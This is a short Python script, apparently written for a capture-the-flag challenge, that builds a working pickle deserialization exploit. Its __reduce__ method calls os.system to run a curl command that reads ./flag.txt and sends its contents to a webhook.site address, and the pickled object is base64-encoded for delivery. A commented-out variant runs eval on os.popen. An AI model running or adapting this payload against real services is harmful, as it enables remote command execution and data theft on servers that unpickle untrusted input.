import pickle
import os
import base64

#1. creating a  class which has our malicious payload command (‘whoami’)
class Pickle(object):
    def __reduce__(self):
        # p = "__import__('os').popen('cat flag.txt').read()"
        # return (eval, (p,))
        return (os.system, ('curl https://webhook.site/2c8bae2d-400f-4c69-8c78-b7fbfd02bfb5/`cat ./flag.txt`',))

# data = {'name': Pickle(), 'userid': 'a', 'password': 'a'}
pickle_data = base64.b64encode(pickle.dumps(Pickle())).decode('utf-8')
print(pickle_data)
